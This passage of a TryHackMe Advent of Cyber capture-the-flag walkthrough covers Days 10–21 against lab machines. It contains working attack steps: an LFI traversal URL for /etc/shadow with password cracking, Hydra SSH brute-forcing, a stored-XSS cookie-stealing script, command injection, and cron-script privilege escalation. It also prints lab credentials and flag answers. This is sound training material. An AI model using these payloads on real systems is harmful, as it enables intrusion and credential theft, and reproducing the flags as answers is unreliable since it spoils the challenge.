Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100644/rw-r--r--  30    fil   2019-12-08 14:12:44 -0700  ssh-creds.txt

meterpreter > cat ssh-creds.txt
santa:rudolphrednosedreindeer
meterpreter >
```

### 3 - Who is on line 148 of the naughty list?
Login with santa's ssh creds and view `naughty_list.txt`:
```
Melisa Vanhoose
```

### 4 - Who is on line 52 of the nice list?
Login with santa's ssh creds and view `nice_list.txt`:
```
Lindsey Gaffney
```



## Task 16 -- [Day 11] Elf Applications
```
export IP=10.10.133.181
```
### 1 - What is the password inside the creds.txt file?
Initial nmap scan:
```
jeffrowell@kali:~/Documents/TryHackMe/Advent of Cyber/elf_applications$ nmap -sC -sV -Pn -n -oN nmap/initial $IP
Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-25 15:36 MDT
Nmap scan report for 10.10.133.181
Host is up (0.14s latency).
Not shown: 995 closed ports
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.2
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: PASV failed: 500 OOPS: invalid pasv_address
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to 10.8.21.42
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.2 - secure, fast, stable
|_End of status
22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey:
|   2048 14:6f:fc:4d:82:43:eb:e9:6e:f3:0e:01:38:f0:cb:23 (RSA)
|   256 83:33:03:d0:b4:1d:cb:8e:59:6f:13:14:c5:a2:75:b3 (ECDSA)
|_  256 ec:b1:63:c0:6d:98:fd:be:76:31:cd:b9:78:35:2a:bf (ED25519)
111/tcp  open  rpcbind 2-4 (RPC #100000)
| rpcinfo:
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3           2049/udp   nfs
|   100003  3           2049/udp6  nfs
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  1,2,3      20048/tcp   mountd
|   100005  1,2,3      20048/tcp6  mountd
|   100005  1,2,3      20048/udp   mountd
|   100005  1,2,3      20048/udp6  mountd
|   100021  1,3,4      34118/udp   nlockmgr
|   100021  1,3,4      42076/udp6  nlockmgr
|   100021  1,3,4      44669/tcp   nlockmgr
|   100021  1,3,4      46675/tcp6  nlockmgr
|   100024  1          37833/udp   status
|   100024  1          42193/tcp   status
|   100024  1          43504/udp6  status
|   100024  1          60295/tcp6  status
|   100227  3           2049/tcp   nfs_acl
|   100227  3           2049/tcp6  nfs_acl
|   100227  3           2049/udp   nfs_acl
|_  100227  3           2049/udp6  nfs_acl
2049/tcp open  nfs_acl 3 (RPC #100227)
3306/tcp open  mysql   MySQL 5.7.28
| mysql-info:
|   Protocol: 10
|   Version: 5.7.28
|   Thread ID: 4
|   Capabilities flags: 65535
|   Some Capabilities: Support41Auth, ODBCClient, IgnoreSigpipes, LongColumnFlag, SupportsTransactions, SwitchToSSLAfterHandshake, Speaks41ProtocolOld, InteractiveClient, Speaks41ProtocolNew, DontAllowDatabaseTableColumn, IgnoreSpaceBeforeParenthesis, SupportsCompression, LongPassword, ConnectWithDatabase, SupportsLoadDataLocal, FoundRows, SupportsMultipleStatments, SupportsAuthPlugins, SupportsMultipleResults
|   Status: Autocommit
|   Salt: m"Ny\x15':\x0D{K'9\x1D\x1F\x01KY:@\x0E
|_  Auth Plugin Name: mysql_native_password
Service Info: OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.93 seconds
```

NFS is open and we can see what directories are available for us to mount:

```#!/usr/bin/env bash
jeffrowell@kali:~/Documents/TryHackMe/Advent of Cyber/elf_applications$ sudo showmount -e $IP
Export list for 10.10.133.181:
/opt/files *
```

Looks like we can mount `/opt/files`, so we create a local directory `nfs` and mount the share:

```bash
jeffrowell@kali:~/Documents/TryHackMe/Advent of Cyber/elf_applications$ sudo mount $IP:/opt/files nfs
jeffrowell@kali:~/Documents/TryHackMe/Advent of Cyber/elf_applications$ ls
file.txt  nfs  nmap  welcome.msg
jeffrowell@kali:~/Documents/TryHackMe/Advent of Cyber/elf_applications$ cd nfs
jeffrowell@kali:~/Documents/TryHackMe/Advent of Cyber/elf_applications/nfs$ ls
creds.txt
jeffrowell@kali:~/Documents/TryHackMe/Advent of Cyber/elf_applications/nfs$ cat creds.txt
the password is securepassword123
```

### 2 - What is the name of the file running on port 21?
FTP is open with Anonymous login:

```bash
ftp> ls -a
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    4 0        0              67 Dec 10 22:50 .
drwxr-xr-x    4 0        0              67 Dec 10 22:50 ..
-rwxrwxrwx    1 0        0              39 Dec 10 23:19 file.txt
drwxr-xr-x    2 0        0               6 Nov 04  2019 pub
d-wx-wx--x    2 14       50              6 Nov 04  2019 uploads
-rw-r--r--    1 0        0             224 Nov 04  2019 welcome.msg
226 Directory send OK.
```

We can grab down some of these files. In `file.txt` we see some potential SQL creds:

```bash
jeffrowell@kali:~/Documents/TryHackMe/Advent of Cyber/elf_applications$ cat file.txt
remember to wipe mysql:
root
ff912ABD*
```

### 3 - What is the password after enumerating the database?
Connect to MySQL using the password found in `file.txt`:

```bash
jeffrowell@kali:~/Documents/TryHackMe/Advent of Cyber/elf_applications$ mysql -h $IP -u root -p'ff912ABD*' -P 3306
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MySQL connection id is 8
Server version: 5.7.28 MySQL Community Server (GPL)

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MySQL [(none)]>
```

From here we can enumerate the DB for the password:

```SQL
MySQL [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| data               |
| mysql              |
| performance_schema |
| sys                |
+--------------------+
5 rows in set (0.146 sec)

MySQL [(none)]> use data;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MySQL [data]> show tables;
+----------------+
| Tables_in_data |
+----------------+
| USERS          |
+----------------+
1 row in set (0.135 sec)
MySQL [data]> select * from USERS;
+-------+--------------+
| name  | password     |
+-------+--------------+
| admin | bestpassword |
+-------+--------------+
1 row in set (0.138 sec)

```



## Task 17 -- [Day 12] Elfcryption
### 1 - What is the md5 hashsum of the encrypted note1 file?
```bash
jeffrowell@kali:~/Documents/TryHackMe/Advent of Cyber/elfcryption$ md5sum note1.txt.gpg
24cf615e2a4f42718f2ff36b35614f8f  note1.txt.gpg
```

### 2 - Where was elf Bob told to meet Alice?
We can decode the note1 file using GPG key `25daysofchristmas`:
```
jeffrowell@kali:~/Documents/TryHackMe/Advent of Cyber/elfcryption$ gpg -d note1.txt.gpg
gpg: AES encrypted data
gpg: WARNING: server 'gpg-agent' is older than us (2.2.19 < 2.2.20)
gpg: Note: Outdated servers may lack important security fixes.
gpg: Note: Use the command "gpgconf --kill all" to restart them.
gpg: encrypted with 1 passphrase
I will meet you outside Santa's Grotto at 5pm!
```

### 3 - Decrypt note2 and obtain the flag!
Using password `hello`:
```bash
jeffrowell@kali:~/Documents/TryHackMe/Advent of Cyber/elfcryption$ openssl rsautl -decrypt -inkey private.key -in note2_encrypted.txt -out plaintext.txt
Enter pass phrase for private.key:
jeffrowell@kali:~/Documents/TryHackMe/Advent of Cyber/elfcryption$ cat plaintext.txt
THM{ed9ccb6802c5d0f905ea747a310bba23}
```



## Task 18 -- [Day 13] Accumulate
Note, I have a full write up on this room [here](https://github.com/Jeff-Rowell/TryHackMe/tree/master/Blaster).

```
export IP=10.10.57.107
```
### 1 - A web server is running on the target. What is the hidden directory which the website lives on?
Initial nmap scan:

```bash
jeffrowell@kali:~/Documents/TryHackMe/Advent of Cyber/accumulate$ nmap -sC -sV -Pn -n -oN nmap/initial $IP
Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-25 16:08 MDT
Nmap scan report for 10.10.57.107
Host is up (0.14s latency).
Not shown: 998 filtered ports
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info:
|   Target_Name: RETROWEB
|   NetBIOS_Domain_Name: RETROWEB
|   NetBIOS_Computer_Name: RETROWEB
|   DNS_Domain_Name: RetroWeb
|   DNS_Computer_Name: RetroWeb
|   Product_Version: 10.0.14393
|_  System_Time: 2020-05-25T22:08:14+00:00
| ssl-cert: Subject: commonName=RetroWeb
| Not valid before: 2020-05-21T21:44:38
|_Not valid after:  2020-11-20T21:44:38
|_ssl-date: 2020-05-25T22:08:16+00:00; -55s from scanner time.
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -55s, deviation: 0s, median: -55s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.51 seconds
```

Initial gobuster scan finds `/retro`:
```bash
jeffrowell@kali:~/Documents/TryHackMe/Advent of Cyber/accumulate$ gobuster dir -u http://$IP -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.57.107
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/05/25 16:11:04 Starting gobuster
===============================================================
/retro (Status: 301)
```


### 2 - Gain initial access and read the contents of user.txt

Looking through the `/retro` endpoint we find a comment about a log in on the blog post names `Ready Player One`. Following the link to that blog post leads us to a comment were `wade` has left a note:


![wade](https://user-images.githubusercontent.com/32188816/82845814-34bed180-9ea3-11ea-8dd8-ad5bafcab609.png)

We found the domain name of `RETROWEB` from the nmap scan, and now we can connect using the command:
```#!/usr/bin/env bash
jeffrowell@kali:~/Documents/TryHackMe/Advent of Cyber/accumulate$ xfreerdp -u wade -d RETROWEB -p parzival $IP
```

Once we log in there is a file `user.txt` on the desktop:
Also on the desktop is a hhupd binary that we can exploit to get administrator privileges.
```
THM{HACK_PLAYER_ONE}
```

### 3 - [Optional] Elevate privileges and read the content of root.txt
```
THM{COIN_OPERATED_EXPLOITATION}
```



## Task 19 -- [Day 14] Unknown Storage
### 1 - What is the name of the file you found?

Run the aws command:
```bash
aws s3 ls s3://advent-bucket-one
```

```
employee_names.txt
```

### 2 - What is in the file?
Run the aws command to copy the file locally:

```bash
aws s3 cp s3://advent-bucket-one/employee_names.txt .
```

Cat the file:

```
mcchef
```

## Task 20 -- [Day 15] LFI
```
export IP=10.10.60.41
```

Initial nmap scan:

```bash
jeffrowell@kali:~/Documents/TryHackMe/Advent of Cyber/lfi$ nmap -Pn -n -sC -sV -oN nmap/initial $IP
Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-25 16:39 MDT
Nmap scan report for 10.10.60.41
Host is up (0.16s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 81:06:ca:5f:28:50:7e:83:4f:d2:df:c0:b5:5c:9a:a8 (RSA)
|   256 93:2b:12:d8:83:f6:39:84:bc:28:f0:52:32:1d:fb:76 (ECDSA)
|_  256 d1:3d:9e:2c:28:21:8a:0c:0c:f2:88:02:c5:f8:f9:a7 (ED25519)
80/tcp open  http    Node.js (Express middleware)
|_http-title: Public Notes
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 32.27 seconds
```

### 1 - What is Charlie going to book a holiday to?
On home page of the web app:

```
Hawaii
```

### 2 - Read /etc/shadow and crack Charlies password.
If we view the HTML source of this page we notice the following funciton towards the bottom of the source page:

```HTML
<script>
  function getNote(note, id) {
    const url = '/get-file/' + note.replace(/\//g, '%2f')
    $.getJSON(url,  function(data) {
      document.querySelector(id).innerHTML = data.info.replace(/(?:\r\n|\r|\n)/g, '<br>');
    })
  }
  // getNote('server.js', '#note-1')
  getNote('views/notes/note1.txt', '#note-1')
  getNote('views/notes/note2.txt', '#note-2')
  getNote('views/notes/note3.txt', '#note-3')
</script>
```

From this we can see that the application is including files from the endpoint `/get-file/` and is appending onto it `views/notes/note1.txt` to get the local `note2=1.txt` file. We also see that it is replacing the `/` character with `%2f` to URL encode for the web server. using this to our knowledge, we can leak the `/etc/shadow` file with the following payload:

```
http://10.10.60.41/get-file/views%2fnotes%2f..%2f..%2f..%2f..%2f..%2fetc%2fshadow
```

Doing that gives us the `/etc/shadow` file:

![shadow](https://user-images.githubusercontent.com/32188816/82849925-6e99d300-9eb7-11ea-89fa-f46b663e886f.png)

Throwing this hash into a file for JtR and using the `rockyou.txt` wordlists gives us the password:

```bash
jeffrowell@kali:~/Documents/eCPPT/Network_Security/Information Gathering/elsfoo_lab$ /opt/JohnTheRipper/run/john forjohn --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
password1        (charlie)
1g 0:00:00:01 DONE (2020-05-25 18:40) 0.7092g/s 726.2p/s 726.2c/s 726.2C/s 123456..bethany
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

### 3 - What is flag1.txt?
Now we can SSH to the box using `charlie`'s cracked password and get the flag:

```bash
charlie@ip-10-10-60-41:~$ ls
flag1.txt
charlie@ip-10-10-60-41:~$ cat flag1.txt
THM{4ea2adf842713ad3ce0c1f05ef12256d}
```



## Task 21 -- [Day 16] File Confusion
We wrote a python script that answers these 3 questions automatically:

```python
#!/usr/local/bin/python3

import os
import io
import zipfile
import exiftool


def extract(filename):
    num_files = 0
    num_version_files = 0
    password_file = ''
    z = zipfile.ZipFile(filename)
    for f in z.namelist():
        dirname = os.path.splitext(f)[0]
        os.mkdir(dirname)
        content = io.BytesIO(z.read(f))
        zip_file = zipfile.ZipFile(content)
        for i in zip_file.namelist():
            num_files += 1
            zip_file.extract(i, dirname)
            with exiftool.ExifTool() as et:
                meta = et.get_metadata(dirname + '/' + i)
                if 'XMP:Version' in meta and meta['XMP:Version'] == 1.1:
                    num_version_files += 1
            try:
                with open(dirname + '/' + i, 'r') as handle:
                    data = handle.read()
                    if 'password' in data:
                        password_file = dirname + '/' + i
            except UnicodeDecodeError as err:
                continue

    print('1. Number of Files: ' + str(num_files))
    print('2. Number of Files with version 1.1: ' + str(num_version_files))
    print('3. File Containing the password: ' + password_file)

extract('final-final-compressed.zip')
```

Running this script gives the following results:

```bash
jeffrowell@kali:~/Documents/eCPPT/Network_Security/Information Gathering/file_confusion$ ./script.py
1. Number of Files: 50
2. Number of Files with version 1.1: 3
3. File Containing the password: tm/dL6w.txt
```

### 1 - How many files did you extract(excluding all the .zip files)
```
50
```

### 2 - How many files contain Version: 1.1 in their metadata?
```
3
```

###3 - Which file contains the password?
```
dL6w.txt
```

## Task 22 -- [Day 17] Hydra-ha-ha-haa
```
export IP=10.10.6.233
```

Initial nmap scan:

```bash
jeffrowell@kali:~/Documents/eCPPT/Network_Security/Information Gathering/hyrdra_ha_ha_haa$ nmap -Pn -n -sC -sV -oN nmap/initial $IP
Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-25 19:35 MDT
Nmap scan report for 10.10.6.233
Host is up (0.14s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 f8:fa:01:38:47:38:df:90:58:b0:3d:89:17:96:3b:87 (RSA)
|   256 d8:bb:bc:05:e4:6b:1d:58:13:57:34:06:25:f7:e1:70 (ECDSA)
|_  256 61:41:56:02:a0:76:60:ff:d6:24:3e:96:57:a3:5e:03 (ED25519)
80/tcp open  http    Node.js Express framework
| http-title: Christmas Challenge
|_Requested resource was /login
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 37.98 seconds
```

### 1 - Use Hydra to bruteforce molly's web password. What is flag 1? (The flag is mistyped, its THM, not TMH)
Hydra did not work for this, let it run for awhile and it didn't get any results, so I just used SSH to log in and find the flag.

When we log in through SSH we can search for login files and find the following:
```
/home/ubuntu/elf/views/login.ejs
```

Moving into that directory we also see a `/index.ejs`, and in that file we can find the flag that would be returned on the page if hydra ever found the password.

```
THM{2673a7dd116de68e85c48ec0b1f2612e}
```

### 2 - Use Hydra to bruteforce molly's SSH password. What is flag 2?
```bash
jeffrowell@kali:~/Documents/eCPPT/Network_Security/Information Gathering/hyrdra_ha_ha_haa$ hydra -l molly -P /usr/share/wordlists/rockyou.txt ssh://$IP
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-05-25 19:45:13
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://10.10.6.233:22/
[22][ssh] host: 10.10.6.233   login: molly   password: butterfly
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-05-25 19:45:21
```

SSH and get the flag:

```bash
molly@ip-10-10-6-233:~$ ls
flag2.txt
molly@ip-10-10-6-233:~$ cat flag2.txt
THM{c8eeb0468febbadea859baeb33b2541b}
```

## Task 23 -- [Day 18] ELF JS

```
export IP=10.10.12.209
```

Initial nmap scan:

```bash
jeffrowell@kali:~/Documents/TryHackMe/Advent of Cyber/elf_js$ nmap -sC -sV -Pn -n -oN nmap/initial $IP
Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-27 01:23 MDT
Nmap scan report for 10.10.12.209
Host is up (0.14s latency).
Not shown: 997 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey:
|   2048 83:86:ab:3c:f1:3f:4c:c1:83:b9:55:95:f5:d3:4e:c6 (RSA)
|   256 f7:f7:d6:88:22:d4:52:c4:52:e9:d7:37:45:03:17:a8 (ECDSA)
|_  256 06:89:b7:28:d8:bf:d5:4a:f9:e1:3d:fd:9d:2b:f0:06 (ED25519)
111/tcp  open  rpcbind 2-4 (RPC #100000)
| rpcinfo:
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|_  100000  3,4          111/udp6  rpcbind
3000/tcp open  http    Node.js Express framework
| http-title: Hacker Forum | Login
|_Requested resource was /login

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 34.95 seconds
```

### 1 - What is the admin's authid cookie value?
For this challenge we have a stored XSS vulnerability. The plan of attack is to inject a payload script that will post all user's cookies to the form, then when the admin user visits, the cookie will be posted onto the form. The payload will look like this written out:

```HTML
<script>
let req2 = new XMLHttpRequest();
req2.open('POST', 'home');
req2.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
req2.send(['note=' + document.cookie]);
</script>
```

Of course we will need to send this into the form as a one liner, so this is the actual payload:
```HTML
<script>let req2 = new XMLHttpRequest();req2.open('POST', 'home');req2.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');req2.send(['note=' + document.cookie]);</script>
```

Once entered we will see the admin cookie after some time:

![cookies](https://user-images.githubusercontent.com/32188816/82994651-bd329480-9fbf-11ea-8315-89ff3187f91f.png)


## Task 24 -- [Day 19] Commands
```
export IP=10.10.229.88
```

Initial nmap scan:

```bash
jeffrowell@kali:~/Documents/TryHackMe/Advent of Cyber/commands$ nmap -sC -sV -Pn -n -oN nmap/initial $IP
Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-27 02:18 MDT
Nmap scan report for 10.10.229.88
Host is up (0.14s latency).
Not shown: 997 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey:
|   2048 83:86:ab:3c:f1:3f:4c:c1:83:b9:55:95:f5:d3:4e:c6 (RSA)
|   256 f7:f7:d6:88:22:d4:52:c4:52:e9:d7:37:45:03:17:a8 (ECDSA)
|_  256 06:89:b7:28:d8:bf:d5:4a:f9:e1:3d:fd:9d:2b:f0:06 (ED25519)
111/tcp  open  rpcbind 2-4 (RPC #100000)
| rpcinfo:
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|_  100000  3,4          111/udp6  rpcbind
3000/tcp open  http    Node.js (Express middleware)
|_http-title: Site doesn't have a title (text/html; charset=utf-8).

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 33.99 seconds
```


### 1 - What are the contents of the user.txt file?
We start by checking out the `/api/cmd` endpoint. It seems like we can run the `ls` command by appending the command after the endpoint. So `/api/cmd/ls` shows the directory listing:


![ls](https://user-images.githubusercontent.com/32188816/82995478-dd168800-9fc0-11ea-9277-59ca2c9f0d9f.png)


Next we look at what is in the `home` directory:


![ls_home](https://user-images.githubusercontent.com/32188816/82995557-f7506600-9fc0-11ea-9a8f-c020a91a5b3c.png)


Then what is in `bestadmin` directory:


![ls_home_best_admin](https://user-images.githubusercontent.com/32188816/82995647-15b66180-9fc1-11ea-8503-b30a0beaca81.png)


Finally we can cat the flag in `/home/bestadmin/user.txt`:

![user](https://user-images.githubusercontent.com/32188816/82995713-31216c80-9fc1-11ea-81e4-068ec4da5e58.png)




## Task 25 -- [Day 20] Cronjob Privilege Escalation
```
export IP=10.10.187.92
```
### 1 - What port is SSH running on?
```bash
jeffrowell@kali:~/Documents/TryHackMe/Advent of Cyber/cronjob_privilege_escalation$ nmap -sC -sV -Pn -n -oN nmap/initial $IP -T4
Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-26 01:23 MDT
Nmap scan report for 10.10.187.92
Host is up (0.14s latency).
Not shown: 999 closed ports
PORT     STATE SERVICE VERSION
4567/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 67:7d:b9:9f:0b:8b:a1:12:3f:49:f5:a2:12:3c:ce:46 (RSA)
|   256 3a:c2:e1:fa:a9:9c:72:00:95:cf:51:c1:43:d8:9d:85 (ECDSA)
|_  256 21:0c:8d:f6:2a:dd:d3:04:cb:52:b4:4d:f3:66:7c:c6 (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.97 seconds
```


### 2 - Crack sam's password and read flag1.txt
```bash
jeffrowell@kali:~/Documents/TryHackMe/Advent of Cyber/cronjob_privilege_escalation$ hydra -l sam -P /usr/share/wordlists/rockyou.txt ssh://$IP -s 4567
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-05-26 01:25:00
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://10.10.187.92:4567/
[4567][ssh] host: 10.10.187.92   login: sam   password: chocolate
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-05-26 01:25:13
```

```bash
sam@ip-10-10-187-92:~$ ls
flag1.txt
sam@ip-10-10-187-92:~$ cat flag1.txt
THM{dec4389bc09669650f3479334532aeab}
sam@ip-10-10-187-92:~$
```

### 3 - Escalate your privileges by taking advantage of a cronjob running every minute. What is flag2?

Looking in the home directory we find a directory owned by root with full permissions to everyone.

```bash
sam@ip-10-10-34-183:/home$ ls -alh
total 20K
drwxr-xr-x  5 root   root   4.0K Dec 19 20:12 .
drwxr-xr-x 23 root   root   4.0K May 27 02:17 ..
drwxr-xr-x  3 sam    sam    4.0K May 27 02:30 sam
drwxrwxrwx  2 root   root   4.0K May 27 02:30 scripts
drwxr-xr-x  6 ubuntu ubuntu 4.0K Dec 19 20:51 ubuntu
```

Navigating in that directory we find a script that is owned by `ubuntu` and likely being run as cron:

```bash
sam@ip-10-10-34-183:/home/scripts$ ls -alh
total 16K
drwxrwxrwx 2 root   root   4.0K Dec 19 20:55 .
drwxr-xr-x 5 root   root   4.0K Dec 19 20:12 ..
-rwxrwxrwx 1 ubuntu ubuntu   14 Dec 19 20:55 clean_up.sh
-rw-r--r-- 1 root   root      5 Dec 19 20:55 test.txt
sam@ip-10-10-34-183:/home/scripts$ cat clean_up.sh
rm -rf /tmp/*
```

We can verify that this script is being run as a minutely cron by watching the `/tmp` directory, creating a file in `/tmp`, and verifying that the file is removed after one minute. Here is the payload that we can put into the `clean_up.sh` script to get the flag:

```bash
#!/bin/bash

cat /home/ubuntu/flag2.txt >> /home/sam/cron_flag.txt
chmod 444 /home/sam/cron_flag.txt
```

And we get the flag:

```bash
sam@ip-10-10-34-183:~$ cd /home/sam
sam@ip-10-10-34-183:~$ ls
cron_flag.txt  flag1.txt
sam@ip-10-10-34-183:~$ cat cron_flag.txt
THM{b27d33705f97ba2e1f444ec2da5f5f61}
```


## Task 26 -- [Day 21] Reverse ELF-ineering
### 1 - What is the value of local_ch when its corresponding movl instruction is called(first if multiple)?
Starting off we will need to run radare2 in debug mode against our `challenge1` binary. I've downloaded the zip and have unzipped it. We can start by analyzing all public symbols (i.e. the program's entry point):

```bash
jeffrowell@kali:~/Documents/eCPPT/Network_Security/Information Gathering/reverse_elf_engineering$ ls
challenge1  file1  files.zip
jeffrowell@kali:~/Documents/eCPPT/Network_Security/Information Gathering/reverse_elf_engineering$ r2 -d ./challenge1
Process with PID 880417 started...
= attach 880417 880417
bin.baddr 0x00400000
Using 0x400000
asm.bits 64
[0x00400a30]> aa
```

Since the question is asking for the value of `local_ch` at the first call of it's corresponding `movl` (or `mov dword`) instruction, we will need to make note of a couple of memory locations:
  1. **0x00400b51** - This is the address where the first `movl` (mov dword) instruction is called for the `local_ch` variable
  2. **rbp-0xc** - This is the address of the `local_ch` variable in memory

With these addresses, we will first need to set a break-point at `0x00400b51` so we can stop program execution. Once at the break-point, we can then analyze the value held in the `local_ch` memory address `rbp-0xc`. To do this we can execute the following steps in radare2 debug mode:
  1. `db 0x00400b51` - set a break-point at the first `movl` instruction for `local_ch`

  ![main_start](https://user-images.githubusercontent.com/32188816/82859762-d579b500-9ed4-11ea-8578-c121d4bad5a8.png)

  2. `pdf @main` - this is optional, to verify that the break-point was set in the correct location

    ![main_after_breakpointset](https://user-images.githubusercontent.com/32188816/82865030-17115c80-9ee3-11ea-90c6-5afb877b66d9.png)

  3. `dc` - execute the program (this will stop at the break-point)


  4. `px @rbp-0xc` - print a hex dump of the `local_ch` variable to analyze it's value before the `movl` call

    ![local_ch_before](https://user-images.githubusercontent.com/32188816/82865174-59d33480-9ee3-11ea-9715-8f7b28178c83.png)

  5. `ds` - step once into the function
  6. `px @rbp-0xc` - print a hex dump of the `local_ch` variable to analyze it's value after the `movl` call

    ![local_ch_after](https://user-images.githubusercontent.com/32188816/82865262-8dae5a00-9ee3-11ea-95c0-892ab62c4f41.png)

In the last screen shot, we can see that the value of `local_ch` is set to 1.

### 2 - What is the value of eax when the imull instruction is called?
Similar to the last question, we will need to set a break-point again, but this time right before the call to `imull`. We will excecute the following steps:
  1. Find the address of the call to `imull`
  2. Set a break-point at that addresses
  3. View the register before and after the `imull` instruction

So this is very similar to the last question, but this time we are analyzing register values instead of argument values. Here is how we can analyze:
  1. `pdf @main` - analyze the function to see the address of `imul`
  2. `db 0x00400b62` - set a break-point at the call to `imul` and optionally run `pdf @main` to verify the break-point location

    ![imul_bp](https://user-images.githubusercontent.com/32188816/82865695-9bb0aa80-9ee4-11ea-9c04-2ff99a4771a9.png)

  3. `dc` - execute the program until it stops at the break-point and run `dr` to analyze the target register

    ![before_imul_step](https://user-images.githubusercontent.com/32188816/82865727-b2570180-9ee4-11ea-9fdb-03f59b03765a.png)

  4. `ds` - step into the program to execute the `imul` function and run `dr` once more to analyze the change in the target register

    ![after_imul_step](https://user-images.githubusercontent.com/32188816/82865771-c7cc2b80-9ee4-11ea-8d22-407fb104bb37.png)


As we can see, the `eax` register holds the value of 6.

### 3 - What is the value of local_4h before eax is set to 0?

This is very similar to the first question, only using the address of a different variable:

  1. `pdf @main` to find where `eax` is set to 0 and `db 0x00400b69` to set a break-point at that location
    * also make note of the location of the target variable `local_4h` is at `rbp-0x4`

